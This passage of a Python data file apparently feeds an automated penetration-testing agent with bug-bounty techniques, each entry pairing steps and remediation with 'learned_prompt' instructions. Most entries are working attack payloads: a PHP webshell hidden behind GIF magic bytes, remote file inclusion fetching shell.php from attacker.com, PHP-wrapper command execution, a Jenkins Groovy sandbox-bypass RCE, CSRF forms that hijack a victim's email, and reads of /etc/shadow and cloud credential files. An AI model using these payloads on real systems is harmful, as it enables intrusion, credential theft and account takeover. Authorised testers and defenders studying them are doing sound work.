        "remediation": "Block access to .git, .svn, .env, and backup file extensions via web server config. Remove backup files from web root. Implement proper access controls on admin paths.",
        "learned_mission": "Fuzz all discovered hosts for directories and sensitive files. Check for VCS exposure (.git, .svn). Test 403 bypass techniques. Discover API documentation endpoints.",
        "learned_prompt": "Use ffuf with recursion and multiple extensions. Check for .git/config exposure. Test 403 bypass with X-Original-URL and path encoding. Look for swagger/openapi docs.",
        "affected_phases": ["P15"],
        "affected_skills": ["asset_discovery", "delivery_mapping"],
        "recommended_tools": ["ffuf", "feroxbuster", "gobuster", "dirsearch", "wfuzz"],
        "learned_techniques": [
            {"name": "Recursive directory fuzzing", "phase": "P15", "tool": "ffuf"},
            {"name": "Git repository exposure", "phase": "P15", "tool": "nuclei"},
            {"name": "403 bypass", "phase": "P15", "tool": "nuclei"},
            {"name": "Backup file discovery", "phase": "P15", "tool": "ffuf"},
            {"name": "Sensitive file enumeration", "phase": "P15", "tool": "ffuf"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # FILE UPLOAD (P17)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Arbitrary File Upload - Bypass Techniques (AllAboutBugBounty)",
        "vulnerability_type": "File Upload",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "9 file upload bypass techniques for achieving RCE via webshell upload, covering MIME type manipulation, extension tricks, and magic bytes injection.",
        "steps_to_reproduce": """
WHERE: Profile photo upload, document upload, avatar features.

BYPASS TECHNIQUES:
1. CONTENT-TYPE MANIPULATION:
   Change Content-Type from application/x-php → image/jpeg
   Submit PHP file with image MIME type

2. DUAL EXTENSION:
   Upload: dapos.php.jpg
   Server may execute the PHP portion

3. MAGIC BYTES + CODE:
   Start file with: GIF89a;
   Then add: <?php system($_GET['cmd']); ?>
   Content-Type: image/gif

4. NULL BYTE INJECTION:
   file.php%00.gif → server strips after null, executes .php

5. DOUBLE EXTENSION:
   file.jpg.php (server parses rightmost)

6. ALTERNATIVE PHP EXTENSIONS:
   .php4, .php5, .phtml, .php7, .pht, .phps

7. CASE VARIATION:
   file.pHP5, file.PhP, file.PHp

8. COMPACT PAYLOAD:
   (<?=`$_GET[x]`?>) - shorter payload to bypass length restrictions

9. SVG XSS:
   <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

10. EXIF XSS (metadata):
    exiftool -Artist='"><script>alert(1)</script>' image.jpeg

11. FILENAME XSS:
    "><svg onload=alert(1)>.jpeg

AFTER UPLOAD - find file location:
  Check response for upload path
  Guess: /uploads/, /images/, /files/, /media/
  Brute force with ffuf

Evidence: Webshell accessible, command execution confirmed (id, whoami), or XSS triggered from uploaded file
""",
        "impact": "Arbitrary file upload leads to Remote Code Execution (webshell), server compromise, data exfiltration, and lateral movement.",
        "remediation": "Validate file type by magic bytes, not extension or MIME header. Store uploads outside webroot. Rename files server-side. Scan uploads with antivirus. Disable script execution in upload directories.",
        "learned_mission": "Test all file upload features with alternative extensions and MIME types. Try magic bytes injection. Test XSS via filename and metadata. Find uploaded file location.",
        "learned_prompt": "Test .php .php5 .phtml extensions. Change Content-Type to image/jpeg for PHP files. Add GIF89a magic bytes. Try null byte injection. Look for filename reflected in page.",
        "affected_phases": ["P17"],
        "affected_skills": ["risk_assessment", "exploitation_validation"],
        "recommended_tools": ["nuclei"],
        "learned_techniques": [
            {"name": "File upload bypass via extension", "phase": "P17", "tool": "nuclei"},
            {"name": "File upload bypass via MIME type", "phase": "P17", "tool": "nuclei"},
            {"name": "File upload XSS via SVG", "phase": "P17", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # OSINT & SECRETS (P07, P21)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "OSINT - Google Dorks, GitHub Dorks, Shodan for Reconnaissance (AllAboutBugBounty)",
        "vulnerability_type": "Information Exposure",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "OSINT techniques using Google dorks, GitHub dorks, and Shodan queries to discover sensitive information, credentials, and exposed infrastructure.",
        "steps_to_reproduce": """
GOOGLE DORKS:
  site:target.com intitle:"index of"
  site:target.com ext:env OR ext:sql OR ext:log OR ext:bak
  site:target.com inurl:admin OR inurl:login OR inurl:dashboard
  site:pastebin.com target.com password
  site:github.com target.com API_KEY
  site:target.com "MYSQL_ROOT_PASSWORD:"
  "-----BEGIN RSA PRIVATE KEY-----" site:target.com

GITHUB DORKS (search on github.com):
  "target.com" password filename:.env
  "target.com" api_key OR apikey OR api_secret
  "target.com" "-----BEGIN RSA PRIVATE KEY-----"
  org:targetorg password OR secret OR token
  "target.com" DB_PASSWORD filename:*.yml
  "target.com" aws_access_key_id

SHODAN DORKS:
  org:"Target Company" port:8080,8443,8888
  hostname:target.com vuln:CVE-2021-44228
  ssl:"target.com" port:443
  http.title:"Dashboard" org:"Target"
  "MongoDB Server Information" port:27017
  product:"Jenkins" port:8080
  "X-Jenkins" http.status:200
  "Redis" port:6379

AUTOMATED (KingOfBugBounty):
  trufflehog github --org=TargetOrg --only-verified
  gitleaks detect --source=./cloned_repo
  theHarvester -d target.com -l 500 -b all

Evidence: Exposed credentials, API keys, private keys, database dumps, internal documentation
""",
        "impact": "OSINT findings expose credentials, infrastructure details, internal documentation, and API keys that directly enable unauthorized access.",
        "remediation": "Rotate all exposed credentials immediately. Remove sensitive data from public repositories. Implement secret scanning in CI/CD pipelines. Configure Google to remove cached sensitive pages.",
        "learned_mission": "Run Google and GitHub dorks before active scanning. Use Shodan to find exposed services. Search for exposed credentials with trufflehog and gitleaks.",
        "learned_prompt": "Use Google dorks with site:target.com for sensitive files. Search GitHub with org: qualifier. Use Shodan for exposed services. Run trufflehog on discovered repositories.",
        "affected_phases": ["P07", "P21"],
        "affected_skills": ["threat_intel", "asset_discovery"],
        "recommended_tools": ["shodan-cli", "theHarvester", "trufflehog", "gitleaks"],
        "learned_techniques": [
            {"name": "Google dorking", "phase": "P07", "tool": "theHarvester"},
            {"name": "GitHub dorking", "phase": "P07", "tool": "trufflehog"},
            {"name": "Shodan recon", "phase": "P07", "tool": "shodan-cli"},
            {"name": "Secret scanning in repos", "phase": "P21", "tool": "trufflehog"},
        ],
    },
    {
        "title": "Exposed API Keys & Credential Leakage (AllAboutBugBounty + KingOfBugBounty)",
        "vulnerability_type": "Sensitive Data Exposure",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty", "https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "Discover exposed API keys in JavaScript files, response headers, and public repositories. Validate discovered keys and assess their permissions.",
        "steps_to_reproduce": """
DISCOVERY IN JS FILES:
  cat js.txt | xargs -I@ curl -s @ | grep -oiE "(api[_-]?key|apikey|api_secret)[=:]['\"]?[a-zA-Z0-9]{16,}['\"]?" | anew api_keys.txt

AUTOMATED JS ANALYSIS:
  linkfinder -i https://target.com -d -o cli
  secretfinder -i https://target.com -e -o cli

CLOUD CREDENTIAL EXPOSURE:
  cat alive.txt | httpx -silent -path /.aws/credentials,/.docker/config.json,/kubeconfig -mc 200

COMMON API KEY PATTERNS:
  AWS: AKIA[0-9A-Z]{16}
  GitHub: ghp_[a-zA-Z0-9]{36}
  Stripe: sk_live_[a-zA-Z0-9]{24}
  Slack: xox[baprs]-[a-zA-Z0-9-]+
  Firebase: AIza[0-9A-Za-z-_]{35}

VALIDATION (keyhacks methodology):
  AWS: aws sts get-caller-identity --access-key AKIA... --secret-key ...
  GitHub: curl -H "Authorization: token ghp_..." https://api.github.com/user
  Stripe: curl https://api.stripe.com/v1/charges -u sk_live_...:

FIREBASE OPEN DATABASE:
  cat urls.txt | grep -oE "[a-zA-Z0-9-]+\.firebaseio\.com" | xargs -I@ curl -s @/.json | grep -v "null"

S3 OPEN BUCKETS:
  cat s3_buckets.txt | xargs -I@ aws s3 ls s3://@ --no-sign-request 2>/dev/null

Evidence: Valid API key confirmed, S3 bucket listing, Firebase data accessible
""",
        "impact": "Exposed API keys enable unauthorized access to third-party services (AWS, Stripe, GitHub), data exfiltration, and financial damage.",
        "remediation": "Rotate all exposed keys immediately. Implement secret scanning in CI/CD. Use vault solutions. Remove hardcoded credentials from source code.",
        "learned_mission": "Scan all JS files for API key patterns. Check for exposed cloud credentials. Validate discovered keys to confirm impact.",
        "learned_prompt": "Extract JS files and scan with regex patterns for API keys. Check .aws/credentials and cloud config paths. Use keyhacks methodology to validate.",
        "affected_phases": ["P07", "P21"],
        "affected_skills": ["threat_intel", "actions_on_objectives"],
        "recommended_tools": ["trufflehog", "gitleaks", "shodan-cli"],
        "learned_techniques": [
            {"name": "API key extraction from JS", "phase": "P21", "tool": "trufflehog"},
            {"name": "Cloud credential exposure", "phase": "P21", "tool": "nuclei"},
            {"name": "S3 bucket enumeration", "phase": "P10", "tool": "nuclei"},
            {"name": "Firebase open database", "phase": "P10", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # SUBDOMAIN TAKEOVER (P09)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Subdomain Takeover Detection (KingOfBugBounty + AllAboutBugBounty)",
        "vulnerability_type": "Subdomain Takeover",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips", "https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "Detect and exploit subdomain takeovers on cloud services (GitHub Pages, Heroku, Fastly, S3). Includes automated nuclei scanning and manual verification.",
        "steps_to_reproduce": """
AUTOMATED SCANNING:
  subfinder -d target.com -silent | httpx -silent | nuclei -t takeovers/ -c 50
  cat alive.txt | subjack -c fingerprints.json -t 100 -o takeover.txt

MANUAL DETECTION:
  1. Find CNAME pointing to external service
     dig CNAME sub.target.com → sub.target.com CNAME service.azurewebsites.net
  2. Check if CNAME destination is unclaimed
     curl -I https://service.azurewebsites.net → 404 "website not found"
  3. Register the service and claim the subdomain

COMMON VULNERABLE SERVICES:
  GitHub Pages: CNAME → username.github.io (404 = claimable)
  Heroku: CNAME → app.herokuapp.com (no such app = claimable)
  Fastly: 404 Fastly error
  Amazon S3: NoSuchBucket error
  Azure: CNAME → *.azurewebsites.net (NXDOMAIN or 404)
  Shopify: Sorry, this shop is currently unavailable
  Tumblr: There's nothing here
  Zendesk: Help Center Closed

VERIFICATION:
  curl -H "Host: sub.target.com" https://vulnerable-service.com
  Check response for takeover indicators (NoSuchBucket, NXDOMAIN, service not found)

Evidence: Subdomain claimed by registering external service account, content served under target's subdomain
""",
        "impact": "Subdomain takeover allows attackers to serve content under trusted domain, steal cookies, conduct phishing, and bypass CSP.",
        "remediation": "Remove dangling CNAME records. Implement subdomain inventory monitoring. Alert on NXDOMAIN responses for known subdomains. Use wildcard SSL only when necessary.",
        "learned_mission": "After subdomain enumeration, test all subdomains for takeover. Check CNAME chains. Verify against known vulnerable service fingerprints.",
        "learned_prompt": "Run nuclei takeovers templates on all alive hosts. Use subjack for CNAME-based detection. Check for NoSuchBucket, NXDOMAIN, service-not-found indicators.",
        "affected_phases": ["P09"],
        "affected_skills": ["threat_intel", "asset_discovery"],
        "recommended_tools": ["subjack", "nuclei"],
        "learned_techniques": [
            {"name": "Subdomain takeover via CNAME", "phase": "P09", "tool": "subjack"},
            {"name": "S3 bucket takeover", "phase": "P09", "tool": "nuclei"},
            {"name": "GitHub Pages takeover", "phase": "P09", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # CSRF (P12, P16)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Cross-Site Request Forgery (CSRF) - Token Bypass Techniques (AllAboutBugBounty)",
        "vulnerability_type": "CSRF",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "CSRF exploitation and token bypass. Look for forms without CSRF tokens. Test 5 bypass strategies when tokens exist.",
        "steps_to_reproduce": """
DETECTION: Find forms missing CSRF token in the request.

EXPLOITATION PAYLOADS:
1. GET-based:
   <a href="https://target.com/settings?email=attacker@evil.com">Click</a>

2. HTML form POST:
   <form action="https://target.com/settings" method="POST">
     <input name="email" value="attacker@evil.com">
     <input type="submit">
   </form>
   <script>document.forms[0].submit()</script>

3. XMLHttpRequest GET:
   <script>
   var xhr = new XMLHttpRequest();
   xhr.open('GET', 'https://target.com/settings?email=attacker@evil.com');
   xhr.withCredentials = true;
   xhr.send();
   </script>

4. JSON POST with credentials:
   fetch('https://target.com/api/settings', {
     method: 'POST', credentials: 'include',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({email: 'attacker@evil.com'})
   })

TOKEN BYPASS STRATEGIES:
  a. Modify last character of token
  b. Delete the token entirely
  c. Submit empty token value
  d. Change POST to GET (token may not be validated)
  e. Use another user's valid token
  f. Base64 decode → modify → re-encode
  g. Check if only part of token is validated (static prefix)

Evidence: Action performed on victim account without their interaction
""",
        "impact": "CSRF enables unauthorized state-changing actions: email/password change, fund transfer, account settings modification. Can lead to account takeover.",
        "remediation": "Implement SameSite=Strict cookies. Use CSRF tokens tied to session. Validate Origin/Referer headers. Use custom request headers for AJAX.",
        "learned_mission": "Check all state-changing forms for CSRF tokens. Test token bypass techniques. Focus on account settings, password change, and financial operations.",
        "learned_prompt": "Find forms and state-changing POST requests. Check for CSRF token. Try removing token, using empty value, and switching to GET. Test SameSite cookie attribute.",
        "affected_phases": ["P12", "P16"],
        "affected_skills": ["risk_assessment", "exploitation_validation"],
        "recommended_tools": ["nuclei", "wapiti"],
        "learned_techniques": [
            {"name": "CSRF on state-changing endpoints", "phase": "P12", "tool": "nuclei"},
            {"name": "CSRF token bypass", "phase": "P12", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # OAUTH (P14)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "OAuth Misconfiguration - Token Theft & Account Takeover (AllAboutBugBounty)",
        "vulnerability_type": "OAuth Misconfiguration",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "OAuth vulnerabilities including redirect_uri manipulation, state parameter bypass, account confusion, scope manipulation, and client_secret leakage.",
        "steps_to_reproduce": """
1. REDIRECT_URI MANIPULATION:
   Modify redirect_uri to attacker domain:
   /oauth/authorize?client_id=X&redirect_uri=https://evil.com&response_type=code
   Try subdomain: redirect_uri=https://evil.target.com
   Try path: redirect_uri=https://target.com@evil.com
   Try IDN homograph: redirect_uri=https://tаrget.com (Cyrillic а)

2. STATE PARAMETER BYPASS (CSRF on OAuth):
   Remove state parameter from authorization request
   Use fixed/predictable state value
   Inject malicious authorization code into victim session

3. ACCOUNT CONFUSION:
   Register OAuth account with victim's email
   If same email used for both OAuth and regular login → access collision

4. SCOPE MANIPULATION:
   Remove email scope to get token without email binding
   Inject extra scopes: scope=read+write+admin

5. CLIENT_SECRET LEAKAGE:
   Search JS files for client_secret
   Check mobile app decompilation

6. OPEN REDIRECT CHAIN:
   Find open redirect on target domain
   redirect_uri=https://target.com/redirect?url=https://evil.com
   Victim's auth code sent to attacker via redirect chain

CHAIN: Open redirect → OAuth token theft → Account takeover

Evidence: Auth code or access token received on attacker-controlled domain
""",
        "impact": "OAuth vulnerabilities lead to account takeover, unauthorized API access, and privilege escalation.",
        "remediation": "Validate redirect_uri strictly (exact match). Implement and verify state parameter. Bind OAuth accounts by verified email only. Keep client_secret server-side.",
        "learned_mission": "Test OAuth flows for redirect_uri bypass. Check state parameter enforcement. Look for open redirects to chain. Search for client_secret in JS.",
        "learned_prompt": "Intercept OAuth flow. Try redirect_uri to attacker domain. Remove or replay state parameter. Check for open redirect on target to chain for token theft.",
        "affected_phases": ["P14"],
        "affected_skills": ["risk_assessment", "installation_risk"],
        "recommended_tools": ["nuclei", "curl-headers"],
        "learned_techniques": [
            {"name": "OAuth redirect_uri bypass", "phase": "P14", "tool": "nuclei"},
            {"name": "OAuth state CSRF", "phase": "P14", "tool": "nuclei"},
            {"name": "OAuth account confusion", "phase": "P14", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # HOST HEADER INJECTION (P13)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Host Header Injection - Password Reset Poisoning (AllAboutBugBounty)",
        "vulnerability_type": "Host Header Injection",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "Host header injection targeting password reset flows and cache poisoning. 5 exploitation techniques including header duplication and override headers.",
        "steps_to_reproduce": """
WHERE: Password reset emails, subscription confirmations.

TECHNIQUES:
1. DIRECT MODIFICATION:
   Host: evil.com
   (Password reset link generated with evil.com domain)

2. DUPLICATE HOST HEADER:
   Host: target.com
   Host: evil.com

3. LINE WRAPPING:
   Host:  target.com (space before value)
     evil.com (indented second line)

4. OVERRIDE HEADERS:
   X-Forwarded-Host: evil.com
   X-Forwarded-For: evil.com
   X-Client-IP: evil.com
   X-Remote-IP: evil.com
   X-Remote-Addr: evil.com
   X-Host: evil.com

5. ABSOLUTE URL IN REQUEST LINE:
   GET https://evil.com/path HTTP/1.1
   Host: target.com

ATTACK FLOW:
  1. Request password reset for victim email
  2. Inject Host: evil.com or X-Forwarded-Host: evil.com
  3. Victim receives email with reset link to evil.com
  4. Victim clicks link → token sent to attacker

CACHE POISONING VARIANT:
  Poison cache with X-Forwarded-Host: evil.com
  All users get response with evil.com references

Evidence: Password reset link in email contains attacker's domain, or cached response with injected host
""",
        "impact": "Host header injection leads to password reset link poisoning, cache poisoning with malicious content, and SSRF in some configurations.",
        "remediation": "Validate Host header against allowlist. Build reset URLs from configured base URL, not Host header. Configure web server to reject unexpected Host values.",
        "learned_mission": "Test password reset and email confirmation flows for host header injection. Try X-Forwarded-Host override. Test for cache poisoning impact.",
        "learned_prompt": "Add X-Forwarded-Host: attacker.com to password reset requests. Check if generated email link uses injected hostname. Try duplicate Host headers.",
        "affected_phases": ["P13"],
        "affected_skills": ["risk_assessment", "adversarial_hypothesis"],
        "recommended_tools": ["nuclei", "curl-headers"],
        "learned_techniques": [
            {"name": "Host header password reset poisoning", "phase": "P13", "tool": "nuclei"},
            {"name": "X-Forwarded-Host injection", "phase": "P13", "tool": "curl-headers"},
            {"name": "Host header cache poisoning", "phase": "P13", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # LFI (P12)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Local File Inclusion (LFI) & Remote File Inclusion (RFI) (AllAboutBugBounty)",
        "vulnerability_type": "Local File Inclusion",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "LFI and RFI exploitation covering path traversal, PHP wrappers, null byte injection, and encoding bypasses.",
        "steps_to_reproduce": """
WHERE: ?page=, ?file=, ?path=, ?template=, ?include= parameters.

BASIC PATH TRAVERSAL:
  /index.php?page=../../../../etc/passwd
  /index.php?page=../../../etc/shadow

URL ENCODED:
  /index.php?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
  /index.php?page=%252e%252e%252f (double encoded)
  /index.php?page=..%c0%af..%c0%afetc/passwd (UTF-8)

NULL BYTE (bypass extension append):
  /index.php?page=../../../../etc/passwd%00

PHP WRAPPERS:
  php://filter - read file as base64:
    /index.php?page=php://filter/convert.base64-encode/resource=index.php
  php://input - execute POST data:
    POST body: <?php system('id'); ?>
  zip:// - execute zip contents:
    upload zip with PHP shell → /index.php?page=zip://uploads/shell.zip%23shell
  data:// - execute inline:
    /index.php?page=data://text/plain,<?php system('id'); ?>
  expect:// - direct command:
    /index.php?page=expect://id
  phar:// - PHAR archive execution

FROM EXISTING DIRECTORIES:
  /index.php?page=uploads/../../../../../etc/passwd

REMOTE FILE INCLUSION:
  /index.php?page=http://attacker.com/shell.php
  /index.php?page=ftp://attacker.com/shell.txt
  URL encoded: /index.php?page=http%3A%2F%2Fattacker.com%2Fshell.php

AUTOMATED:
  cat urls.txt | gf lfi | uro | qsreplace "../../../etc/passwd" | httpx -silent -ms "root:"

Evidence: /etc/passwd contents displayed, source code disclosed, command execution via wrappers
""",
        "impact": "LFI exposes server files including credentials, source code, and configurations. PHP wrappers can escalate to RCE. RFI is direct RCE.",
        "remediation": "Validate and sanitize file paths. Use whitelist for allowed files/templates. Disable allow_url_include and allow_url_fopen in PHP. Never pass user input directly to include().",
        "learned_mission": "Test file inclusion parameters with path traversal. Try PHP wrappers for source code disclosure. Test RFI for direct code execution.",
        "learned_prompt": "Use gf lfi to find candidates. Test with ../../../../etc/passwd. Try php://filter for source code. Test null byte bypass. Check for RFI with http:// scheme.",
        "affected_phases": ["P12"],
        "affected_skills": ["risk_assessment", "exploitation_validation"],
        "recommended_tools": ["nuclei", "wapiti", "ffuf-params"],
        "learned_techniques": [
            {"name": "LFI path traversal", "phase": "P12", "tool": "nuclei"},
            {"name": "LFI PHP wrappers", "phase": "P12", "tool": "nuclei"},
            {"name": "RFI", "phase": "P12", "tool": "nuclei"},
            {"name": "LFI null byte bypass", "phase": "P12", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # CMS & TECHNOLOGY-SPECIFIC (P20)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "WordPress Security Testing (AllAboutBugBounty)",
        "vulnerability_type": "CMS Vulnerability",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "WordPress-specific security testing: version detection, plugin CVEs, user enumeration, XML-RPC abuse, and debug log exposure.",
        "steps_to_reproduce": """
DETECTION:
  Source contains wp-content/ links
  /wp-login.php accessible

VERSION:
  cat feed/rss2 | grep 'generator'
  /wp-includes/version.php (if exposed)
  wpscan --url https://target.com --enumerate vp,vt,u

USER ENUMERATION:
  https://target.com/?author=1 (redirect reveals username)
  https://target.com/wp-json/wp/v2/users (REST API)

DEBUG LOG:
  https://target.com/wp-content/debug.log

BACKUP CONFIG:
  /wp-config.php.bak, /wp-config.php.old, /wp-config.php~

XML-RPC ABUSE:
  curl -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>' https://target.com/xmlrpc.php
  (can brute force with system.multicall - 500 attempts in one request)

XSPA VIA PINGBACK:
  POST to xmlrpc.php with pingback.ping to internal URLs for SSRF

REGISTRATION:
  /wp-register.php?action=register

WP-SCAN:
  wpscan --url https://target.com --enumerate vp --api-token TOKEN
  wpscan --url https://target.com -P wordlist.txt -U admin (password spray)

Evidence: User list, installed plugins with CVEs, accessible debug log, credential via XML-RPC
""",
        "impact": "WordPress vulnerabilities lead to RCE via vulnerable plugins, credential theft, full site takeover, and SEO spam injection.",
        "remediation": "Keep WordPress core, plugins, and themes updated. Disable XML-RPC if not needed. Disable user enumeration. Remove debug.log. Implement 2FA.",
        "learned_mission": "Detect WordPress installations. Enumerate versions and plugins. Check for user enumeration and XML-RPC abuse. Look for debug logs and backup configs.",
        "learned_prompt": "Run wpscan with --enumerate vp,vt,u. Check /wp-json/wp/v2/users. Test xmlrpc.php. Look for debug.log and backup config files.",
        "affected_phases": ["P20"],
        "affected_skills": ["risk_assessment", "threat_intel"],
        "recommended_tools": ["wpscan", "nuclei", "nikto"],
        "learned_techniques": [
            {"name": "WordPress user enumeration", "phase": "P20", "tool": "wpscan"},
            {"name": "WordPress plugin CVE scan", "phase": "P20", "tool": "wpscan"},
            {"name": "WordPress XML-RPC abuse", "phase": "P20", "tool": "nuclei"},
        ],
    },
    {
        "title": "Jenkins Security Testing (AllAboutBugBounty)",
        "vulnerability_type": "CVE Exploitation",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "Jenkins vulnerability testing: deserialization RCE (CVE-2015-8103), auth bypass (CVE-2018-1000861), Script Sandbox bypass (CVE-2019-1003030), and unauthenticated access.",
        "steps_to_reproduce": """
DETECTION:
  curl -I https://target.com | grep X-Jenkins  (reveals version)

UNAUTHENTICATED ACCESS:
  Check if Jenkins dashboard accessible without auth
  https://target.com/ or https://target.com:8080/

DEFAULT CREDENTIALS:
  admin:admin
  admin:password

AUTH BYPASS (CVE-2018-1000861 - Jenkins < 2.150.1):
  curl -k -4 -s https://target.com/securityRealm/user/admin/search/index?q=a

SCRIPT SANDBOX BYPASS RCE (CVE-2019-1003030):
  POST to /checkScript with URL-encoded Groovy:
  GroovyScript: Thread.currentThread().getContextClassLoader().loadClass("java.lang.Runtime").getMethod("exec","".class).invoke(Thread.currentThread().getContextClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

DESERIALIZATION RCE (CVE-2015-8103 - Jenkins <= 1.638):
  Use ysoserial to generate payload:
  java -jar ysoserial.jar CommonsCollections1 'id' | gzip | base64

NUCLEI SCAN:
  nuclei -u https://target.com -t http/vulnerabilities/jenkins/

Evidence: RCE output, unauthenticated dashboard access, credential theft
""",
        "impact": "Jenkins vulnerabilities lead to RCE on the CI/CD system, access to source code, credentials, and ability to inject malicious code into build pipelines.",
        "remediation": "Update Jenkins and all plugins. Enforce authentication. Disable script console for non-admins. Network-isolate Jenkins. Use least-privilege service accounts.",
        "learned_mission": "Detect Jenkins via X-Jenkins header. Test for unauthenticated access. Run nuclei Jenkins templates. Test default credentials.",
        "learned_prompt": "Check for X-Jenkins header. Try unauthenticated access to dashboard. Run nuclei jenkins templates. Test default admin:admin credentials.",
        "affected_phases": ["P11", "P12"],
        "affected_skills": ["risk_assessment", "threat_intel"],
        "recommended_tools": ["nuclei", "httpx", "nikto"],
        "learned_techniques": [
            {"name": "Jenkins unauthenticated access", "phase": "P11", "tool": "nuclei"},
            {"name": "Jenkins CVE scanning", "phase": "P11", "tool": "nuclei"},
            {"name": "Jenkins default credentials", "phase": "P14", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # MASS ASSIGNMENT / BUSINESS LOGIC (P16, P19)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Mass Assignment & Business Logic Errors (AllAboutBugBounty)",
        "vulnerability_type": "Mass Assignment",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "Mass assignment exploitation and business logic flaws. Inject admin=true, test negative quantities, race conditions on single-use codes, and price manipulation.",
        "steps_to_reproduce": """
MASS ASSIGNMENT:
  Standard request: {"username": "test"}
  Attack: {"username": "test", "admin": true, "role": "admin", "isAdmin": true, "is_admin": 1, "privilege": "admin"}
  (Common in Ruby on Rails, NodeJS frameworks)

  Automated:
  cat api_endpoints.txt | grep -iE "(user|account|profile|register|signup|update)" | xargs -I@ curl -s -X POST @ -H "Content-Type: application/json" -d '{"admin":true,"role":"admin","isAdmin":true,"privilege":"admin"}' -w "%{http_code}"

BUSINESS LOGIC - COUPONS:
  1. Reuse single-use coupon codes
  2. Race condition: send concurrent requests to use same code twice
  3. Negative quantities in cart → negative total
  4. Currency conversion manipulation

BUSINESS LOGIC - PRICING:
  Modify price parameter in request to negative value
  Change quantity to negative (credit instead of charge)
  Manipulate free delivery threshold

BUSINESS LOGIC - PREMIUM FEATURES:
  Force-browse to premium endpoints without subscription
  Modify true/false parameters in response to simulate premium
  Access premium features after subscription cancellation

BUSINESS LOGIC - REFUNDS:
  Request refund and keep access
  Race condition: request refund multiple times simultaneously
  Currency arbitrage (pay in low-value currency, get refund in high-value)

RACE CONDITION (Turbo Intruder):
  Send 20+ concurrent requests to single-use endpoint
  One request per 'slot' to maximize chances

Evidence: Admin access granted, negative charge applied, premium features unlocked without payment
""",
        "impact": "Mass assignment and business logic flaws lead to privilege escalation, financial fraud, unauthorized premium access, and data manipulation.",
        "remediation": "Use allowlists for accepted parameters server-side. Never trust client-supplied data for privilege or role. Implement rate limiting and concurrent request detection.",
        "learned_mission": "Test registration and update APIs for mass assignment. Send admin=true parameters. Test race conditions on single-use codes. Try negative values in cart/pricing.",
        "learned_prompt": "Inject role/admin/privilege parameters in update requests. Test race conditions with concurrent requests. Try negative quantities. Check for premium feature force-browsing.",
        "affected_phases": ["P16", "P19"],
        "affected_skills": ["risk_assessment", "adversarial_hypothesis"],
        "recommended_tools": ["nuclei", "arjun", "ffuf-post"],
        "learned_techniques": [
            {"name": "Mass assignment privilege escalation", "phase": "P16", "tool": "nuclei"},
            {"name": "Business logic race condition", "phase": "P16", "tool": "nuclei"},
            {"name": "Price/quantity manipulation", "phase": "P16", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # SSL/TLS (P18)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "SSL/TLS & Security Headers Audit (P18/P05)",
        "vulnerability_type": "SSL/TLS Misconfiguration",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "Audit SSL/TLS configuration for weak ciphers, protocol versions, certificate issues, and missing security headers aligned with OWASP A05.",
        "steps_to_reproduce": """
SSL/TLS AUDIT:
  sslscan --no-colour target.com
  testssl.sh --fast target.com
  nmap --script ssl-enum-ciphers -p 443 target.com

CHECK FOR:
  - SSLv2, SSLv3 (deprecated, vulnerable)
  - TLS 1.0, TLS 1.1 (deprecated)
  - Weak ciphers: RC4, DES, 3DES, EXPORT, NULL
  - BEAST, POODLE, HEARTBLEED vulnerabilities
  - Self-signed or expired certificates
  - Certificate chain issues
  - HSTS not set or too short
  - Certificate transparency not enforced

SECURITY HEADERS (curl-headers):
